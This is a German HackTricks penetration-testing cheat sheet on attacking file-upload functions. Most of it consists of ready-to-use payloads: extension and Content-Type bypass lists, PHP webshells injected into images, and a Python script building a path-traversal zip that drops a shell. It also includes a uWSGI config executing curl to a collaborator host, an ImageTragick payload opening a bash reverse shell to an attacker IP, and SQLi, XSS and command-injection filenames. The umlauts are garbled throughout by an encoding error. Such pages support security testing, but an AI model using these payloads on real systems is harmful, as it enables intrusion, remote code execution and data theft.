# Datei-Upload

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys senden.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hacking-Karriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## Allgemeine Methodik zum Datei-Upload

Andere n√ºtzliche Erweiterungen:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Arbeiten in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Umgehen von Dateierweiterungspr√ºfungen

1. Wenn sie angewendet werden, **√ºberpr√ºfen** Sie die **vorherigen Erweiterungen**. Testen Sie sie auch mit einigen **Gro√übuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _√úberpr√ºfen Sie, ob Sie eine **g√ºltige Erweiterung vor** der Ausf√ºhrungserweiterung hinzuf√ºgen k√∂nnen (verwenden Sie auch vorherige Erweiterungen):_
* _file.png.php_
* _file.png.Php5_
3. Versuchen Sie, **Sonderzeichen am Ende hinzuzuf√ºgen**. Sie k√∂nnten Burp verwenden, um alle **ASCII**- und **Unicode**-Zeichen **bruteforce** zu verwenden. (_Beachten Sie, dass Sie auch die **zuvor** genannten **Erweiterungen** verwenden k√∂nnen_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Versuchen Sie, die Schutzma√ünahmen zu umgehen, indem Sie den **Erweiterungsparser** auf der Serverseite mit Techniken wie dem **Verdoppeln** der **Erweiterung** oder dem Hinzuf√ºgen von **Junk**-Daten (**Null**-Bytes) zwischen den Erweiterungen **t√§uschen**. _Sie k√∂nnen auch die **vorherigen Erweiterungen** verwenden, um ein besseres Payload vorzubereiten._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. F√ºgen Sie eine **weitere Schicht von Erweiterungen** zur vorherigen √úberpr√ºfung hinzu:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Versuchen Sie, die **Ausf√ºhrungserweiterung vor der g√ºltigen Erweiterung** zu platzieren und hoffen Sie, dass der Server falsch konfiguriert ist. (n√ºtzlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Erweiterung\*\* _**.php**_**, aber** nicht unbedingt mit .php endet\*\* Code ausf√ºhren wird):
* _z. B. file.php.png_
7. Verwenden von **NTFS-Alternativen Datenstr√∂men (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunkt ":" nach einer verbotenen Erweiterung und vor einer erlaubten eingef√ºgt. Dadurch wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z. B. "file.asax:.jpg"). Diese Datei kann sp√§ter bearbeitet werden, indem andere Techniken wie die Verwendung ihres Kurznamens verwendet werden. Das Muster "**::$data**" kann auch verwendet werden, um nicht leere Dateien zu erstellen. Daher kann das Hinzuf√ºgen eines Punktzeichens nach diesem Muster auch n√ºtzlich sein, um weitere Einschr√§nkungen zu umgehen (z. B. "file.asp::$data.").
8. Versuchen Sie, die Dateinamenbeschr√§nkungen zu umgehen. Die g√ºltige Erweiterung wird abgeschnitten. Und das b√∂sartige PHP bleibt √ºbrig. AAA<--SNIP-->AAA.php

```
# Linux maximal 255 Bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # hier 4 abziehen und .png hinzuf√ºgen
# Laden Sie die Datei hoch und √ºberpr√ºfen Sie die Antwort, wie viele Zeichen erlaubt sind. Angenommen, 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Erstellen Sie das Payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Umgehen von Content-Type, Magic Number, Komprimierung & Gr√∂√üen√§nderung

* Umgehen Sie **Content-Type**-√úberpr√ºfungen, indem Sie den **Wert** des **Content-Type-Headers** auf: _image/png_, _text/plain, application/octet-stream_ setzen.
1. Content-Type **Wortliste**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Umgehen Sie die **Magic Number**-√úberpr√ºfung, indem Sie am Anfang der Datei die **Bytes eines echten Bildes** hinzuf√ºgen (um den _file_-Befehl zu verwirren). Oder f√ºhren Sie die Shell in die **Metadaten** ein:\
`exiftool -Comment="<?php echo 'Befehl:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder Sie k√∂nnten auch das **Payload direkt** in ein Bild einf√ºgen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Wenn **Komprimierung zu Ihrem Bild hinzugef√ºgt wird**, z.B. durch die Verwendung einiger Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die zuvor genannten Techniken nicht n√ºtzlich. Sie k√∂nnten jedoch den **PLTE-Chunk** [**hier definierte Technik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzuf√ºgen, der **die Komprimierung √ºberleben wird**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Die Webseite k√∂nnte auch das **Bild verkleinern**, z.B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Sie k√∂nnten jedoch den **IDAT-Chunk** [**hier definierte Technik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzuf√ºgen, der **die Komprimierung √ºberleben wird**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Eine weitere Technik, um ein Payload zu erstellen, der **eine Bildverkleinerung √ºberlebt**, ist die Verwendung der PHP-GD-Funktion `thumbnailImage`. Sie k√∂nnten jedoch den **tEXt-Chunk** [**hier definierte Technik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzuf√ºgen, der **die Komprimierung √ºberleben wird**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Weitere Tricks zum √úberpr√ºfen

* Finden Sie eine Schwachstelle, um die bereits hochgeladene Datei umzubenennen (um die Erweiterung zu √§ndern).
* Finden Sie eine Schwachstelle f√ºr **Local File Inclusion**, um die Backdoor auszuf√ºhren.
* **M√∂gliche Informationsfreigabe**:
1. Laden Sie **mehrmals** (und **gleichzeitig**) dieselbe Datei mit dem **gleichen Namen hoch**.
2. Laden Sie eine Datei mit dem **Namen einer Datei** oder eines **Ordners hoch**, der **bereits existiert**.
3. Laden Sie eine Datei mit **‚Äú.‚Äù, ‚Äú..‚Äù oder ‚Äú‚Ä¶‚Äù als Namen** hoch. Zum Beispiel, in Apache in **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis ‚Äú/www/uploads/‚Äù speichert, wird der Dateiname ‚Äú.‚Äù eine Datei namens ‚Äúuploads‚Äù im Verzeichnis ‚Äú/www/‚Äù erstellen.
4. Laden Sie eine Datei hoch, die m√∂glicherweise nicht leicht gel√∂scht werden kann, wie **‚Äú‚Ä¶:.jpg‚Äù** in **NTFS** (Windows).
5. Laden Sie eine Datei in **Windows** mit **ung√ºltigen Zeichen** wie `|<>*?‚Äù` in ihrem Namen hoch (Windows).
6. Laden Sie eine Datei in **Windows** unter Verwendung von **reservierten** (**verbotenen**) **Namen** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
* Versuchen Sie auch, eine ausf√ºhrbare Datei (.exe) oder eine **.html** (weniger verd√§chtig) hochzuladen, die **Code ausf√ºhrt**, wenn sie versehentlich vom Opfer ge√∂ffnet wird.

### Spezielle Erweiterungstricks

Wenn Sie versuchen, Dateien auf einem **PHP-Server hochzuladen**, [schauen Sie sich den **.htaccess**-Trick an, um Code auszuf√ºhren](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Wenn Sie versuchen, Dateien auf einem **ASP-Server hochzuladen**, [schauen Sie sich den **.config**-Trick an, um Code auszuf√ºhren](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar`-Dateien sind wie die `.jar`-Dateien f√ºr Java, aber f√ºr PHP und k√∂nnen wie eine PHP-Datei **verwendet werden** (durch Ausf√ºhren mit PHP oder Einbinden in ein Skript...).

Die Erweiterung `.inc` wird manchmal f√ºr PHP-Dateien verwendet, die nur zum **Import von Dateien** dienen, sodass jemand diese Erweiterung m√∂glicherweise **zur Ausf√ºhrung zugelassen hat**.

## **Jetty RCE**

Wenn Sie eine XML-Datei in einen Jetty-Server hochladen k√∂nnen, k√∂nnen Sie [RCE erhalten, da **neue \*.xml- und \*.war-Dateien automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Laden Sie also die XML-Datei in `$JETTY_BASE/webapps/` hoch und erwarten Sie die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

F√ºr eine detaillierte Erkundung dieser Schwachstelle lesen Sie die Originalforschung: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE)-Schwachstellen k√∂nnen in uWSGI-Servern ausgenutzt werden, wenn man die F√§higkeit hat, die `.ini`-Konfigurationsdatei zu √§ndern. uWSGI-Konfigurationsdateien verwenden eine spezifische Syntax, um "magische" Variablen, Platzhalter und Operatoren einzubeziehen. Insbesondere der '@'-Operator, der als `@(Dateiname)` verwendet wird, ist dazu gedacht, den Inhalt einer Datei einzuschlie√üen. Unter den verschiedenen unterst√ºtzten Schemata in uWSGI ist das "exec"-Schema besonders m√§chtig und erm√∂glicht das Lesen von Daten aus der Standardausgabe eines Prozesses. Diese Funktion kann f√ºr b√∂swillige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read manipuliert werden, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachten Sie das folgende Beispiel einer sch√§dlichen `uwsgi.ini`-Datei, die verschiedene Schemata zeigt:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausf√ºhrung der Nutzlast erfolgt w√§hrend des Parsens der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (m√∂glicherweise nach einem Absturz oder aufgrund eines Denial-of-Service-Angriffs) oder die Datei muss auf Auto-Reload eingestellt sein. Das Auto-Reload-Feature l√§dt die Datei in festgelegten Intervallen neu, wenn √Ñnderungen erkannt werden.

Es ist entscheidend, die lockere Natur des Konfigurationsdatei-Parsings von uWSGI zu verstehen. Insbesondere kann die besprochene Nutzlast in eine Bin√§rdatei (wie ein Bild oder PDF) eingef√ºgt werden, was den potenziellen Ausbeutungsbereich weiter ausdehnt.

## **wget Datei-Upload/SSRF-Trick**

In einigen F√§llen kann es vorkommen, dass ein Server **`wget`** zum **Herunterladen von Dateien** verwendet und Sie die **URL angeben** k√∂nnen. In diesen F√§llen √ºberpr√ºft der Code m√∂glicherweise, ob die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. **Diese √úberpr√ºfung kann jedoch umgangen werden.**\
Die **maximale** L√§nge eines **Dateinamens** in **Linux** betr√§gt **255**, jedoch k√ºrzt **wget** die Dateinamen auf **236** Zeichen. Sie k√∂nnen eine Datei namens "A"\*232+".php"+".gif" herunterladen, dieser Dateiname wird die **√úberpr√ºfung umgehen** (da in diesem Beispiel **".gif"** eine **g√ºltige** Erweiterung ist), aber `wget` wird die Datei in **"A"\*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Beachten Sie, dass **eine weitere Option**, die Sie m√∂glicherweise in Betracht ziehen, um diese √úberpr√ºfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die urspr√ºngliche URL die √úberpr√ºfung umgeht und wget dann die umgeleitete Datei mit dem neuen Namen herunterl√§dt. Dies **funktioniert nicht**, **es sei denn**, wget wird mit dem **Parameter** `--trust-server-names` verwendet, da **wget die umgeleitete Seite mit dem Namen der Datei herunterl√§dt, der in der urspr√ºnglichen URL angegeben ist**.

## Werkzeuge

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) ist ein leistungsstarkes Tool, das Pentestern und Bug Bounty J√§gern dabei hilft, Datei-Upload-Mechanismen zu testen. Es nutzt verschiedene Bug-Bounty-Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und eine gr√ºndliche Bewertung von Webanwendungen sicherzustellen.

## Vom Datei-Upload zu anderen Schwachstellen

* Setzen Sie den **Dateinamen** auf `../../../tmp/lol.png` und versuchen Sie, eine **Pfadtraversierung** zu erreichen
* Setzen Sie den **Dateinamen** auf `sleep(10)-- -.jpg` und Sie k√∂nnten eine **SQL-Injektion** erreichen
* Setzen Sie den **Dateinamen** auf `<svg onload=alert(document.domain)>`, um ein XSS zu erreichen
* Setzen Sie den **Dateinamen** auf `; sleep 10;`, um einige Befehlsinjektionen zu testen (mehr [Befehlsinjektionstricks hier](../command-injection.md))
* [**XSS** in Bild (svg) Datei-Upload](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** Datei **Upload** + **XSS** = [**Service Workers** Ausnutzung](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg-Upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Offene Weiterleitung** durch Hochladen einer svg-Datei](../open-redirect.md#open-redirect-uploading-svg-files)
* Versuchen Sie **verschiedene svg-Payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Ber√ºhmte **ImageTrick**-Schwachstelle](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Wenn Sie den Webserver **anweisen k√∂nnen, ein Bild von einer URL abzurufen**, k√∂nnten Sie versuchen, einen [SSRF](../ssrf-server-side-request-forgery/) auszunutzen. Wenn dieses **Bild** auf einer **√∂ffentlichen** Website gespeichert wird, k√∂nnten Sie auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen von jedem Besucher stehlen**.
* [**XXE und CORS**-Umgehung mit PDF-Adobe-Upload](pdf-upload-xxe-and-cors-bypass.md)
* Speziell pr√§parierte PDFs f√ºr XSS: Die [folgende Seite zeigt, wie man **PDF-Daten einspeist, um JS-Ausf√ºhrung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn Sie PDFs hochladen k√∂nnen, k√∂nnten Sie einige PDFs vorbereiten, die beliebigen JS gem√§√ü den angegebenen Anweisungen ausf√ºhren.
* Laden Sie den \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalt hoch, um zu √ºberpr√ºfen, ob der Server ein **Antivirus** hat
* √úberpr√ºfen Sie, ob es eine **Gr√∂√üenbeschr√§nkung** beim Hochladen von Dateien gibt

Hier ist eine Top-10-Liste von Dingen, die Sie durch Hochladen erreichen k√∂nnen (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Gespeichertes XSS / SSRF / XXE
3. **GIF**: Gespeichertes XSS / SSRF
4. **CSV**: CSV-Injektion
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML-Injektion / XSS / Offene Weiterleitung
8. **PNG / JPEG**: Pixel-Flutangriff (DoS)
9. **ZIP**: RCE √ºber LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-Erweiterung

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magische Header-Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) f√ºr andere Dateitypen.

### Zip/Tar-Datei automatisch dekomprimierter Upload

Wenn Sie eine ZIP-Datei hochladen k√∂nnen, die auf dem Server dekomprimiert wird, k√∂nnen Sie 2 Dinge tun:

#### Symlink

Laden Sie einen Link hoch, der symbolische Links zu anderen Dateien enth√§lt, und greifen Sie dann auf die dekomprimierten Dateien zu, um auf die verkn√ºpften Dateien zuzugreifen:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimieren in verschiedenen Ordnern

Die unerwartete Erstellung von Dateien in Verzeichnissen w√§hrend der Dekomprimierung ist ein erhebliches Problem. Trotz anf√§nglicher Annahmen, dass diese Konfiguration m√∂glicherweise vor der Ausf√ºhrung von Befehlen auf OS-Ebene durch b√∂sartige Datei-Uploads sch√ºtzt, k√∂nnen die hierarchische Komprimierungsunterst√ºtzung und die Verzeichnis-Traversal-F√§higkeiten des ZIP-Archivformats ausgenutzt werden. Dies erm√∂glicht es Angreifern, Beschr√§nkungen zu umgehen und sichere Upload-Verzeichnisse zu verlassen, indem sie die Dekomprimierungsfunktionalit√§t der gezielten Anwendung manipulieren.

Ein automatisierter Exploit zur Erstellung solcher Dateien ist unter [**evilarc auf GitHub**](https://github.com/ptoomey3/evilarc) verf√ºgbar. Das Dienstprogramm kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zus√§tzlich ist der **Symlink-Trick mit Evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzugreifen, sollte ein Symlink zu dieser Datei in Ihrem System erstellt werden. Dies stellt sicher, dass Evilarc w√§hrend seines Betriebs keine Fehler meldet.

Im Folgenden finden Sie ein Beispiel f√ºr Python-Code, der verwendet wird, um eine b√∂sartige Zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Ausnutzung der Kompression f√ºr Dateispraying**

F√ºr weitere Details **√ºberpr√ºfen Sie den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle aus der `$_REQUEST`-Variablen auszuf√ºhren.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Dateispraying und Erstellung komprimierter Dateien**: Es werden mehrere Dateien erstellt und ein Zip-Archiv wird erstellt, das diese Dateien enth√§lt.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **√Ñnderung mit einem Hex-Editor oder vi**: Die Namen der Dateien innerhalb des Zip-Archivs werden mit vi oder einem Hex-Editor ge√§ndert, indem "xxA" in "../" ge√§ndert wird, um Verzeichnisse zu durchqueren.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laden Sie diesen Inhalt mit einer Bildendung hoch, um die Schwachstelle auszunutzen **(ImageMagick, 7.0.1-1)** (aus dem [Exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP-Shell in PNG

Das Einbetten einer PHP-Shell im IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` von PHP-GD sind in diesem Zusammenhang besonders relevant, da sie h√§ufig f√ºr das √Ñndern der Gr√∂√üe und das Neuberechnen von Bildern verwendet werden. Die F√§higkeit der eingebetteten PHP-Shell, von diesen Operationen unber√ºhrt zu bleiben, ist ein bedeutender Vorteil f√ºr bestimmte Anwendungsf√§lle.

Eine ausf√ºhrliche Erkundung dieser Technik, einschlie√ülich ihrer Methodik und potenziellen Anwendungen, wird in folgendem Artikel bereitgestellt: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verst√§ndnis des Prozesses und seiner Auswirkungen.

Mehr Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglotte Dateien

Polyglotte Dateien dienen als einzigartiges Werkzeug in der Cybersicherheit und fungieren als Cham√§leons, die gleichzeitig in mehreren Dateiformaten g√ºltig existieren k√∂nnen. Ein faszinierendes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), eine Hybridform, die sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf diese Kombination beschr√§nkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls m√∂glich.

Der Kernnutzen von polyglotten Dateien liegt in ihrer F√§higkeit, Sicherheitsma√ünahmen zu umgehen, die Dateien basierend auf ihrem Typ √ºberpr√ºfen. Eine g√§ngige Praxis in verschiedenen Anwendungen besteht darin, nur bestimmte Dateitypen f√ºr den Upload zuzulassen - wie JPEG, GIF oder DOC - um das Risiko durch potenziell sch√§dliche Formate (z. B. JS, PHP oder Phar-Dateien) zu mindern. Ein Polyglott kann jedoch, indem es den strukturellen Kriterien mehrerer Dateitypen entspricht, diese Beschr√§nkungen heimlich umgehen.

Trotz ihrer Anpassungsf√§higkeit sto√üen Polyglotte auf Einschr√§nkungen. Beispielsweise kann ein Polyglott gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG verk√∂rpern, aber der Erfolg seines Uploads k√∂nnte von den Dateierweiterungsrichtlinien der Plattform abh√§ngen. Wenn das System strengere Richtlinien f√ºr zul√§ssige Erweiterungen hat, reicht die blo√üe strukturelle Dualit√§t eines Polyglotts m√∂glicherweise nicht aus, um seinen Upload zu garantieren.

Mehr Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referenzen

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
